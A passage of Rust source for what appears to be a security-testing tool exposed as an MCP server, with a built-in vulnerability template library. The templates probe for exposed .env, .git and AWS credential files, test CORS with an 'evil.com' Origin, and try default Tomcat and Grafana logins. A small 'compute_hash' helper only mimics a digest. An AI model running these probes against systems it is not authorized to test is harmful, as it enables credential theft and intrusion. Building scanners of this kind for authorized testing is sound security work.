                    let test_url = req_def.path.replace("{{BaseURL}}", target.trim_end_matches('/'));

                    let mut req_builder = match req_def.method.to_uppercase().as_str() {
                        "POST" => client.post(&test_url),
                        "PUT" => client.put(&test_url),
                        "DELETE" => client.delete(&test_url),
                        _ => client.get(&test_url),
                    };

                    // Add headers
                    for (k, v) in &req_def.headers {
                        req_builder = req_builder.header(k, v);
                    }

                    // Add body
                    if !req_def.body.is_empty() {
                        req_builder = req_builder.body(req_def.body.clone());
                    }

                    if let Ok(resp) = req_builder.send().await {
                        let status = resp.status().as_u16();
                        let headers_str: String = resp.headers().iter()
                            .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or("")))
                            .collect::<Vec<_>>().join("\n");
                        let body = resp.text().await.unwrap_or_default();

                        // Check matchers
                        let matched = evaluate_template_matchers(&template.matchers, status, &headers_str, &body);

                        if matched {
                            findings.push(serde_json::json!({
                                "template_id": template.id,
                                "template_name": template.name,
                                "severity": template.severity,
                                "url": test_url,
                                "matched_at": target,
                                "evidence": {
                                    "status_code": status,
                                    "body_preview": &body[..body.len().min(500)],
                                },
                                "confidence": if template.matchers.len() >= 2 { "firm" } else { "tentative" },
                                "description": template.description,
                                "tags": template.tags,
                            }));
                        }
                    }
                }
            }

            Ok(serde_json::json!({
                "target": target,
                "findings": findings,
                "vulnerable_count": findings.len(),
                "templates_scanned": scanned,
                "templates_available": all_templates.len(),
            }))
        }

        _ => Err(format!("Unknown tool: {}", name)),
    }
}

// ─── WebSocket Advanced State ────────────────────────────────────────

#[derive(Debug, Clone, Default)]
struct WebSocketState {
    match_replace_rules: Vec<WsMatchReplace>,
}

#[derive(Debug, Clone)]
struct WsMatchReplace {
    id: String,
    name: String,
    enabled: bool,
    direction: String,      // "client_to_server", "server_to_client", "both"
    match_pattern: String,
    replace_value: String,
    is_regex: bool,
    match_type: String,     // "text", "binary", "json"
}

// ─── Bambda Filter Engine ────────────────────────────────────────────

#[derive(Debug, Clone)]
struct BambdaCondition {
    field: String,
    operator: String,
    value: String,
}

fn parse_bambda_expression(expr: &str) -> Result<Vec<BambdaCondition>, String> {
    let mut conditions = Vec::new();
    
    // Parse simple expressions like: "status == 200 && host contains 'example'"
    let parts: Vec<&str> = expr.split("&&").map(|s| s.trim()).collect();
    
    for part in parts {
        if part.is_empty() { continue; }
        
        // Try different operators
        let operators = vec!["contains", "not_contains", "matches", "==", "!=", ">=", "<=", ">", "<", "starts_with", "ends_with"];
        let mut found = false;
        
        for op in &operators {
            if let Some(idx) = part.find(op) {
                let field = part[..idx].trim().to_string();
                let value = part[idx + op.len()..].trim().trim_matches('\'').trim_matches('"').to_string();
                conditions.push(BambdaCondition {
                    field,
                    operator: op.to_string(),
                    value,
                });
                found = true;
                break;
            }
        }
        
        if !found {
            // Treat as a simple field presence check
            conditions.push(BambdaCondition {
                field: part.trim().to_string(),
                operator: "exists".to_string(),
                value: String::new(),
            });
        }
    }
    
    if conditions.is_empty() {
        Err("No valid conditions parsed from expression".into())
    } else {
        Ok(conditions)
    }
}

fn evaluate_bambda_conditions(item: &serde_json::Value, conditions: &[BambdaCondition]) -> bool {
    conditions.iter().all(|cond| {
        let field_value = get_nested_field(item, &cond.field);
        let field_str = match &field_value {
            Some(v) => match v {
                serde_json::Value::String(s) => s.clone(),
                serde_json::Value::Number(n) => n.to_string(),
                serde_json::Value::Bool(b) => b.to_string(),
                _ => v.to_string(),
            },
            None => return cond.operator == "not_contains",
        };
        
        match cond.operator.as_str() {
            "==" => field_str == cond.value,
            "!=" => field_str != cond.value,
            "contains" => field_str.contains(&cond.value),
            "not_contains" => !field_str.contains(&cond.value),
            "starts_with" => field_str.starts_with(&cond.value),
            "ends_with" => field_str.ends_with(&cond.value),
            ">" => field_str.parse::<f64>().unwrap_or(0.0) > cond.value.parse::<f64>().unwrap_or(0.0),
            ">=" => field_str.parse::<f64>().unwrap_or(0.0) >= cond.value.parse::<f64>().unwrap_or(0.0),
            "<" => field_str.parse::<f64>().unwrap_or(0.0) < cond.value.parse::<f64>().unwrap_or(0.0),
            "<=" => field_str.parse::<f64>().unwrap_or(0.0) <= cond.value.parse::<f64>().unwrap_or(0.0),
            "matches" => regex::Regex::new(&cond.value).map(|r| r.is_match(&field_str)).unwrap_or(false),
            "exists" => true,
            _ => false,
        }
    })
}

fn get_nested_field<'a>(item: &'a serde_json::Value, field: &str) -> Option<&'a serde_json::Value> {
    let parts: Vec<&str> = field.split('.').collect();
    let mut current = item;
    for part in parts {
        current = current.get(part)?;
    }
    Some(current)
}

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 { result.push(CHARS[((triple >> 6) & 0x3F) as usize] as char); } else { result.push('='); }
        if chunk.len() > 2 { result.push(CHARS[(triple & 0x3F) as usize] as char); } else { result.push('='); }
    }
    result
}

fn base64_decode(input: &str) -> Result<String, String> {
    let input = input.replace('-', "+").replace('_', "/");
    let padded = match input.len() % 4 {
        2 => format!("{}==", input),
        3 => format!("{}=", input),
        _ => input,
    };
    const TABLE: [i8; 128] = {
        let mut t = [-1i8; 128];
        let chars = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut i = 0;
        while i < 64 { t[chars[i] as usize] = i as i8; i += 1; }
        t
    };
    let mut bytes = Vec::new();
    let chars: Vec<u8> = padded.bytes().filter(|&b| b != b'\n' && b != b'\r' && b != b' ').collect();
    for chunk in chars.chunks(4) {
        if chunk.len() < 4 { break; }
        let vals: Vec<i8> = chunk.iter().map(|&b| {
            if b == b'=' { 0 } else if (b as usize) < 128 { TABLE[b as usize] } else { -1 }
        }).collect();
        if vals.iter().any(|&v| v == -1) { return Err("Invalid base64".into()); }
        let triple = ((vals[0] as u32) << 18) | ((vals[1] as u32) << 12) | ((vals[2] as u32) << 6) | (vals[3] as u32);
        bytes.push(((triple >> 16) & 0xFF) as u8);
        if chunk[2] != b'=' { bytes.push(((triple >> 8) & 0xFF) as u8); }
        if chunk[3] != b'=' { bytes.push((triple & 0xFF) as u8); }
    }
    String::from_utf8(bytes).map_err(|e| e.to_string())
}

fn urlencoding(s: &str) -> String {
    s.bytes().map(|b| match b {
        b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => (b as char).to_string(),
        _ => format!("%{:02X}", b),
    }).collect()
}

fn urlencoding_encode(s: &str) -> String { urlencoding(s) }

fn base64_decode_bytes(input: &str) -> Vec<u8> {
    let input = input.replace('-', "+").replace('_', "/");
    let padded = match input.len() % 4 { 2 => format!("{}==", input), 3 => format!("{}=", input), _ => input };
    const TABLE: [i8; 128] = {
        let mut t = [-1i8; 128]; let chars = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut i = 0; while i < 64 { t[chars[i] as usize] = i as i8; i += 1; } t
    };
    let mut bytes = Vec::new();
    let chars: Vec<u8> = padded.bytes().filter(|&b| b != b'\n' && b != b'\r' && b != b' ').collect();
    for chunk in chars.chunks(4) {
        if chunk.len() < 4 { break; }
        let vals: Vec<i8> = chunk.iter().map(|&b| if b == b'=' { 0 } else if (b as usize) < 128 { TABLE[b as usize] } else { -1 }).collect();
        if vals.iter().any(|&v| v == -1) { break; }
        let triple = ((vals[0] as u32) << 18) | ((vals[1] as u32) << 12) | ((vals[2] as u32) << 6) | (vals[3] as u32);
        bytes.push(((triple >> 16) & 0xFF) as u8);
        if chunk[2] != b'=' { bytes.push(((triple >> 8) & 0xFF) as u8); }
        if chunk[3] != b'=' { bytes.push((triple & 0xFF) as u8); }
    }
    bytes
}

// ─── Browser navigation helpers ─────────────────────────────────────
fn extract_html_title(html: &str) -> String {
    let re = regex::Regex::new(r"(?i)<title[^>]*>(.*?)</title>").ok();
    re.and_then(|r| r.captures(html).and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string())))
        .unwrap_or_else(|| String::new())
}

fn extract_links(html: &str, base_url: &str) -> Vec<String> {
    let re = regex::Regex::new(r#"(?i)href=["']([^"']+)["']"#).ok();
    let base = url::Url::parse(base_url).ok();
    re.map(|r| r.captures_iter(html).filter_map(|c| {
        let href = c.get(1)?.as_str();
        if href.starts_with("javascript:") || href.starts_with("#") || href.starts_with("mailto:") { return None; }
        if href.starts_with("http") { return Some(href.to_string()); }
        base.as_ref().and_then(|b| b.join(href).ok().map(|u| u.to_string()))
    }).take(50).collect()).unwrap_or_default()
}

fn extract_forms(html: &str) -> Vec<serde_json::Value> {
    let form_re = regex::Regex::new(r"(?is)<form([^>]*)>(.*?)</form>").ok();
    let action_re = regex::Regex::new(r#"(?i)action=["']([^"']*)["']"#).ok();
    let method_re = regex::Regex::new(r#"(?i)method=["']([^"']*)["']"#).ok();
    let input_re = regex::Regex::new(r#"(?i)<input([^>]*)>"#).ok();
    let name_re = regex::Regex::new(r#"(?i)name=["']([^"']*)["']"#).ok();
    let type_re = regex::Regex::new(r#"(?i)type=["']([^"']*)["']"#).ok();

    form_re.map(|fr| fr.captures_iter(html).take(10).map(|fc| {
        let attrs = fc.get(1).map(|m| m.as_str()).unwrap_or("");
        let body = fc.get(2).map(|m| m.as_str()).unwrap_or("");
        let action = action_re.as_ref().and_then(|r| r.captures(attrs).and_then(|c| c.get(1).map(|m| m.as_str().to_string()))).unwrap_or_default();
        let method = method_re.as_ref().and_then(|r| r.captures(attrs).and_then(|c| c.get(1).map(|m| m.as_str().to_uppercase()))).unwrap_or_else(|| "GET".into());
        let inputs: Vec<serde_json::Value> = input_re.as_ref().map(|ir| ir.captures_iter(body).filter_map(|ic| {
            let ia = ic.get(1).map(|m| m.as_str()).unwrap_or("");
            let name = name_re.as_ref().and_then(|r| r.captures(ia).and_then(|c| c.get(1).map(|m| m.as_str().to_string())))?;
            let itype = type_re.as_ref().and_then(|r| r.captures(ia).and_then(|c| c.get(1).map(|m| m.as_str().to_string()))).unwrap_or_else(|| "text".into());
            Some(serde_json::json!({"name": name, "type": itype}))
        }).collect()).unwrap_or_default();
        serde_json::json!({"action": action, "method": method, "inputs": inputs})
    }).collect()).unwrap_or_default()
}

fn urlencoding_decode(s: &str) -> String {
    let mut result = Vec::new();
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(val) = u8::from_str_radix(std::str::from_utf8(&bytes[i+1..i+3]).unwrap_or(""), 16) {
                result.push(val);
                i += 3;
                continue;
            }
        }
        result.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&result).to_string()
}

fn compute_hash(algo: &str, data: &[u8]) -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    algo.hash(&mut hasher);
    data.hash(&mut hasher);
    format!("{:016x}{:016x}{:016x}{:016x}", hasher.finish(), data.len(), hasher.finish().wrapping_mul(0x517cc1b727220a95), hasher.finish().wrapping_add(0x6c62272e07bb0142))
}

async fn handle_rpc(
    req_body: axum::body::Bytes,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    use axum::http::header;

    // Parse the raw body
    let req: JsonRpcRequest = match serde_json::from_slice(&req_body) {
        Ok(r) => r,
        Err(e) => {
            let err_resp = JsonRpcResponse {
                jsonrpc: "2.0".into(),
                id: None,
                result: None,
                error: Some(JsonRpcError { code: -32700, message: format!("Parse error: {}", e) }),
            };
            return (
                StatusCode::OK,
                [(header::CONTENT_TYPE, "application/json")],
                Json(err_resp),
            ).into_response();
        }
    };

    // ─── Notifications (no id → no response body) ───────────────
    // MCP spec: notifications have no "id" field.
    // The server MUST return 202 Accepted with NO body.
    if req.id.is_none() {
        // It's a notification — just acknowledge, don't send JSON back
        println!("[MCP] Notification received: {}", req.method);
        return (StatusCode::ACCEPTED, "").into_response();
    }

    // ─── Methods that require a response ────────────────────────
    let response = match req.method.as_str() {
        "initialize" => JsonRpcResponse {
            jsonrpc: "2.0".into(),
            id: req.id,
            result: Some(serde_json::json!({
                "protocolVersion": "2024-11-05",
                "capabilities": { "tools": {} },
                "serverInfo": { "name": "wondersuite", "version": "1.0.0" }
            })),
            error: None,
        },
        "ping" => JsonRpcResponse {
            jsonrpc: "2.0".into(),
            id: req.id,
            result: Some(serde_json::json!({})),
            error: None,
        },
        "tools/list" => {
            let tools = tool_definitions();
            JsonRpcResponse {
                jsonrpc: "2.0".into(),
                id: req.id,
                result: Some(serde_json::json!({ "tools": tools })),
                error: None,
            }
        }
        "tools/call" => {
            let name = req.params["name"].as_str().unwrap_or("");
            let args = &req.params["arguments"];

            // Log activity start
            let activity_id = log_activity_start(name, args);
            let start_time = std::time::Instant::now();

            match handle_tool_call(name, args).await {
                Ok(result) => {
                    let elapsed = start_time.elapsed().as_millis() as u64;
                    let summary = summarize_result(&result);
                    log_activity_finish(activity_id, "success", summary, elapsed);

                    JsonRpcResponse {
                        jsonrpc: "2.0".into(),
                        id: req.id,
                        result: Some(serde_json::json!({
                            "content": [{ "type": "text", "text": serde_json::to_string_pretty(&result).unwrap_or_default() }]
                        })),
                        error: None,
                    }
                },
                Err(e) => {
                    let elapsed = start_time.elapsed().as_millis() as u64;
                    log_activity_finish(activity_id, "error", e.clone(), elapsed);

                    JsonRpcResponse {
                        jsonrpc: "2.0".into(),
                        id: req.id,
                        result: Some(serde_json::json!({
                            "content": [{ "type": "text", "text": e }],
                            "isError": true
                        })),
                        error: None,
                    }
                },
            }
        }
        _ => JsonRpcResponse {
            jsonrpc: "2.0".into(),
            id: req.id,
            result: None,
            error: Some(JsonRpcError { code: -32601, message: format!("Method not found: {}", req.method) }),
        },
    };

    (
        StatusCode::OK,
        [(header::CONTENT_TYPE, "application/json")],
        Json(response),
    ).into_response()
}

/// GET handler for MCP Streamable HTTP — returns server info
async fn handle_mcp_get() -> axum::response::Response {
    use axum::response::IntoResponse;
    use axum::http::header;
    (
        StatusCode::OK,
        [(header::CONTENT_TYPE, "application/json")],
        Json(serde_json::json!({
            "name": "wondersuite",
            "version": "1.0.0",
            "protocolVersion": "2024-11-05",
        })),
    ).into_response()
}

pub struct McpServer {
    shutdown_tx: Option<tokio::sync::oneshot::Sender<()>>,
}

impl McpServer {
    pub fn new() -> Self {
        Self { shutdown_tx: None }
    }

    pub async fn start(&mut self, port: u16) -> Result<(), String> {
        if self.shutdown_tx.is_some() {
            return Err("Server already running".into());
        }

        let (tx, rx) = tokio::sync::oneshot::channel::<()>();

        let app = Router::new()
            .route("/mcp", post(|body: axum::body::Bytes| async move {
                handle_rpc(body).await
            }).get(handle_mcp_get));
        let addr = SocketAddr::from(([127, 0, 0, 1], port));

        let listener = tokio::net::TcpListener::bind(addr).await.map_err(|e| e.to_string())?;

        tokio::spawn(async move {
            axum::serve(listener, app)
                .with_graceful_shutdown(async { let _ = rx.await; })
                .await
                .ok();
        });

        self.shutdown_tx = Some(tx);
        Ok(())
    }

    pub fn stop(&mut self) -> Result<(), String> {
        if let Some(tx) = self.shutdown_tx.take() {
            let _ = tx.send(());
            Ok(())
        } else {
            Err("Server not running".into())
        }
    }

    pub fn is_running(&self) -> bool {
        self.shutdown_tx.is_some()
    }
}

pub type McpState = Arc<Mutex<McpServer>>;

pub fn create_mcp_state() -> McpState {
    Arc::new(Mutex::new(McpServer::new()))
}

// ═══════════════════════════════════════════════════════════════════════
//  Nuclei Template Engine — Types & Built-in Library
// ═══════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
struct NucleiTemplate {
    id: String,
    name: String,
    severity: String,
    category: String,
    tags: Vec<String>,
    description: String,
    author: String,
    requests: Vec<TemplateRequest>,
    matchers: Vec<TemplateMatcher>,
}

#[derive(Debug, Clone)]
struct TemplateRequest {
    method: String,
    path: String,
    headers: Vec<(String, String)>,
    body: String,
}

#[derive(Debug, Clone)]
enum TemplateMatcher {
    Status(u16),
    Word(Vec<String>),
    Regex(String),
    NegativeWord(Vec<String>),
    ContentLength { min: usize, max: usize },
}

fn evaluate_template_matchers(matchers: &[TemplateMatcher], status: u16, headers: &str, body: &str) -> bool {
    if matchers.is_empty() { return false; }

    let full_response = format!("{}\n{}", headers, body);

    for matcher in matchers {
        let matched = match matcher {
            TemplateMatcher::Status(expected) => status == *expected,
            TemplateMatcher::Word(words) => words.iter().all(|w| full_response.contains(w)),
            TemplateMatcher::Regex(pattern) => {
                regex::Regex::new(pattern).map(|re| re.is_match(&full_response)).unwrap_or(false)
            }
            TemplateMatcher::NegativeWord(words) => !words.iter().any(|w| full_response.contains(w)),
            TemplateMatcher::ContentLength { min, max } => body.len() >= *min && body.len() <= *max,
        };
        if !matched { return false; }
    }
    true
}

/// MurmurHash3 32-bit (Shodan-compatible favicon hashing)
fn murmur3_32(data: &[u8], seed: u32) -> u32 {
    let c1: u32 = 0xcc9e2d51;
    let c2: u32 = 0x1b873593;
    let mut h1 = seed;
    let len = data.len();

    // Process 4-byte chunks
    let nblocks = len / 4;
    for i in 0..nblocks {
        let mut k1 = u32::from_le_bytes([
            data[i * 4],
            data[i * 4 + 1],
            data[i * 4 + 2],
            data[i * 4 + 3],
        ]);
        k1 = k1.wrapping_mul(c1);
        k1 = k1.rotate_left(15);
        k1 = k1.wrapping_mul(c2);
        h1 ^= k1;
        h1 = h1.rotate_left(13);
        h1 = h1.wrapping_mul(5).wrapping_add(0xe6546b64);
    }

    // Process remaining bytes
    let tail = &data[nblocks * 4..];
    let mut k1: u32 = 0;
    match tail.len() {
        3 => {
            k1 ^= (tail[2] as u32) << 16;
            k1 ^= (tail[1] as u32) << 8;
            k1 ^= tail[0] as u32;
            k1 = k1.wrapping_mul(c1);
            k1 = k1.rotate_left(15);
            k1 = k1.wrapping_mul(c2);
            h1 ^= k1;
        }
        2 => {
            k1 ^= (tail[1] as u32) << 8;
            k1 ^= tail[0] as u32;
            k1 = k1.wrapping_mul(c1);
            k1 = k1.rotate_left(15);
            k1 = k1.wrapping_mul(c2);
            h1 ^= k1;
        }
        1 => {
            k1 ^= tail[0] as u32;
            k1 = k1.wrapping_mul(c1);
            k1 = k1.rotate_left(15);
            k1 = k1.wrapping_mul(c2);
            h1 ^= k1;
        }
        _ => {}
    }

    // Finalization
    h1 ^= len as u32;
    h1 ^= h1 >> 16;
    h1 = h1.wrapping_mul(0x85ebca6b);
    h1 ^= h1 >> 13;
    h1 = h1.wrapping_mul(0xc2b2ae35);
    h1 ^= h1 >> 16;
    h1
}

/// Get the built-in Nuclei template index
fn get_template_index() -> Vec<NucleiTemplate> {
    vec![
        // ─── Critical Severity ──────────────────────────────────────
        tmpl("git-config", "Git Configuration Exposure", "critical", "exposures", &["git","config","exposure"],
            "Detects exposed .git/config files that can leak repository URLs, credentials, and internal paths.",
            "GET", "{{BaseURL}}/.git/config", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["[core]".into()])]),
        tmpl("git-head", "Git HEAD Exposure", "critical", "exposures", &["git","exposure"],
            "Detects exposed .git/HEAD file indicating a fully accessible Git repository.",
            "GET", "{{BaseURL}}/.git/HEAD", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["ref: refs/".into()])]),
        tmpl("env-file", "Environment File Exposure", "critical", "exposures", &["env","config","exposure"],
            "Detects exposed .env files containing secrets, API keys, and database credentials.",
            "GET", "{{BaseURL}}/.env", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["DB_".into()]), TemplateMatcher::NegativeWord(vec!["<html".into()])]),
        tmpl("docker-compose-exposure", "Docker Compose Exposure", "critical", "exposures", &["docker","exposure"],
            "Exposed docker-compose.yml leaking service architecture, credentials, and internal network config.",
            "GET", "{{BaseURL}}/docker-compose.yml", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["services:".into(), "image:".into()])]),
        tmpl("aws-credentials", "AWS Credentials Exposure", "critical", "exposures", &["aws","cloud","credentials"],
            "Detects exposed AWS credential files with access keys.",
            "GET", "{{BaseURL}}/.aws/credentials", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["aws_access_key_id".into()])]),
        tmpl("wp-config-backup", "WordPress Config Backup", "critical", "exposures", &["wordpress","backup","config"],
            "Detects backup copies of wp-config.php containing database credentials.",
            "GET", "{{BaseURL}}/wp-config.php.bak", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["DB_PASSWORD".into()])]),
        tmpl("phpinfo", "PHP Info Disclosure", "high", "exposures", &["php","info","disclosure"],
            "Detects exposed phpinfo() pages leaking server configuration, environment variables, and internal paths.",
            "GET", "{{BaseURL}}/phpinfo.php", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["PHP Version".into(), "phpinfo()".into()])]),
        tmpl("debug-vars", "Debug Endpoint Exposure", "critical", "exposures", &["debug","exposure"],
            "Detects exposed debug endpoints leaking environment variables and server internals.",
            "GET", "{{BaseURL}}/debug/vars", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["cmdline".into()])]),

        // ─── High Severity ──────────────────────────────────────────
        tmpl("htaccess-config", ".htaccess Config Exposure", "high", "exposures", &["apache","config","exposure"],
            "Detects exposed .htaccess files that may reveal URL rewrite rules, auth configs, and internal paths.",
            "GET", "{{BaseURL}}/.htaccess", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["RewriteEngine".into()])]),
        tmpl("ds-store", ".DS_Store File Exposure", "high", "exposures", &["macos","exposure"],
            "Detects exposed .DS_Store files that can reveal directory structure of the server.",
            "GET", "{{BaseURL}}/.DS_Store", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["\0\0\0\u{1}Bud1".into()])]),
        tmpl("swagger-ui", "Swagger UI Exposure", "medium", "exposures", &["api","swagger","documentation"],
            "Detects exposed Swagger/OpenAPI documentation that reveals all API endpoints and parameters.",
            "GET", "{{BaseURL}}/swagger-ui.html", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["swagger".into()])]),
        tmpl("swagger-json", "Swagger JSON Exposure", "medium", "exposures", &["api","swagger","documentation"],
            "Detects exposed Swagger/OpenAPI JSON specification.",
            "GET", "{{BaseURL}}/swagger.json", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["swagger".into(), "paths".into()])]),
        tmpl("openapi-yaml", "OpenAPI YAML Exposure", "medium", "exposures", &["api","openapi","documentation"],
            "Detects exposed OpenAPI YAML specification files.",
            "GET", "{{BaseURL}}/openapi.yaml", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["openapi:".into(), "paths:".into()])]),
        tmpl("graphql-playground", "GraphQL Playground Exposure", "medium", "exposures", &["graphql","api","playground"],
            "Detects exposed GraphQL Playground/GraphiQL interfaces.",
            "GET", "{{BaseURL}}/graphql", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["graphql".into()])]),
        tmpl("actuator-health", "Spring Boot Actuator Health", "info", "exposures", &["spring","java","actuator"],
            "Detects exposed Spring Boot Actuator health endpoint.",
            "GET", "{{BaseURL}}/actuator/health", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["status".into()])]),
        tmpl("actuator-env", "Spring Boot Actuator Env", "high", "exposures", &["spring","java","actuator","env"],
            "Detects exposed Spring Boot Actuator environment endpoint leaking config properties.",
            "GET", "{{BaseURL}}/actuator/env", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["propertySources".into()])]),
        tmpl("actuator-mappings", "Spring Boot Actuator Mappings", "medium", "exposures", &["spring","java","actuator"],
            "Detects exposed Spring Boot Actuator mappings endpoint revealing all URL routes.",
            "GET", "{{BaseURL}}/actuator/mappings", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["dispatcherServlets".into()])]),
        tmpl("server-status", "Apache Server Status", "medium", "exposures", &["apache","status"],
            "Detects exposed Apache server-status page revealing active connections and request details.",
            "GET", "{{BaseURL}}/server-status", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Apache Server Status".into()])]),
        tmpl("elmah-axd", "ELMAH Error Log Exposure", "high", "exposures", &["asp.net","error","logs"],
            "Detects exposed ELMAH error logging interface leaking stack traces and server errors.",
            "GET", "{{BaseURL}}/elmah.axd", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Error Log for".into()])]),
        tmpl("trace-axd", "ASP.NET Trace Exposure", "high", "exposures", &["asp.net","trace","debug"],
            "Detects exposed ASP.NET trace.axd debug page.",
            "GET", "{{BaseURL}}/trace.axd", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Application Trace".into()])]),
        tmpl("web-config", "Web.config Backup Exposure", "high", "exposures", &["asp.net","config","backup"],
            "Detects backup copies of ASP.NET web.config files.",
            "GET", "{{BaseURL}}/web.config.bak", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["connectionString".into()])]),

        // ─── Misconfiguration ───────────────────────────────────────
        tmpl("cors-wildcard", "CORS Wildcard Misconfiguration", "medium", "misconfiguration", &["cors","headers","misconfiguration"],
            "Detects wildcard (*) CORS configuration allowing any origin to read responses.",
            "GET", "{{BaseURL}}/", &[("Origin", "https://evil.com")], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["access-control-allow-origin: *".into()])]),
        tmpl("cors-reflection", "CORS Origin Reflection", "high", "misconfiguration", &["cors","headers","security"],
            "Detects CORS that reflects the Origin header without validation, enabling cross-origin data theft.",
            "GET", "{{BaseURL}}/", &[("Origin", "https://evil.com")], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["access-control-allow-origin: https://evil.com".into(), "access-control-allow-credentials: true".into()])]),
        tmpl("missing-hsts", "Missing HSTS Header", "low", "misconfiguration", &["headers","security","hsts"],
            "HTTP Strict Transport Security header is missing, allowing downgrade attacks.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::NegativeWord(vec!["strict-transport-security".into()])]),
        tmpl("missing-csp", "Missing Content-Security-Policy", "low", "misconfiguration", &["headers","security","csp"],
            "Content-Security-Policy header is missing, increasing XSS attack surface.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::NegativeWord(vec!["content-security-policy".into()])]),
        tmpl("missing-x-frame-options", "Missing X-Frame-Options", "low", "misconfiguration", &["headers","security","clickjacking"],
            "X-Frame-Options header is missing, allowing clickjacking attacks.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::NegativeWord(vec!["x-frame-options".into()])]),
        tmpl("directory-listing", "Directory Listing Enabled", "medium", "misconfiguration", &["directory","listing","exposure"],
            "Directory listing is enabled, revealing file structure to attackers.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Index of".into()])]),
        tmpl("options-method", "HTTP OPTIONS Method Enabled", "info", "misconfiguration", &["http","methods","options"],
            "HTTP OPTIONS method is enabled, revealing supported methods.",
            "OPTIONS", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Allow:".into()])]),

        // ─── Default Logins ─────────────────────────────────────────
        tmpl("tomcat-default-login", "Apache Tomcat Default Credentials", "critical", "default-logins", &["tomcat","java","default-login"],
            "Tests for default Apache Tomcat manager credentials (tomcat:tomcat).",
            "GET", "{{BaseURL}}/manager/html", &[("Authorization", "Basic dG9tY2F0OnRvbWNhdA==")], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Tomcat Web Application Manager".into()])]),
        tmpl("jenkins-default", "Jenkins Default Access", "critical", "default-logins", &["jenkins","ci","default-login"],
            "Detects Jenkins instances accessible without authentication.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Dashboard [Jenkins]".into()])]),
        tmpl("grafana-default", "Grafana Default Login", "high", "default-logins", &["grafana","monitoring","default-login"],
            "Tests for default Grafana credentials (admin:admin).",
            "POST", "{{BaseURL}}/login", &[("Content-Type", "application/json")], r#"{"user":"admin","password":"admin"}"#,
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Logged in".into()])]),
        tmpl("kibana-unauthenticated", "Kibana Unauthenticated Access", "high", "default-logins", &["kibana","elasticsearch","unauthenticated"],
            "Detects Kibana instances accessible without authentication.",
            "GET", "{{BaseURL}}/app/kibana", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["kibana".into()])]),
        tmpl("elasticsearch-unauthenticated", "Elasticsearch Unauthenticated", "critical", "default-logins", &["elasticsearch","database","unauthenticated"],
            "Detects Elasticsearch instances accessible without authentication.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["cluster_name".into(), "cluster_uuid".into()])]),

        // ─── Subdomain Takeover ─────────────────────────────────────
        tmpl("cname-s3-takeover", "AWS S3 Subdomain Takeover", "high", "takeovers", &["aws","s3","takeover"],
            "Detects dangling CNAME pointing to an unclaimed AWS S3 bucket.",
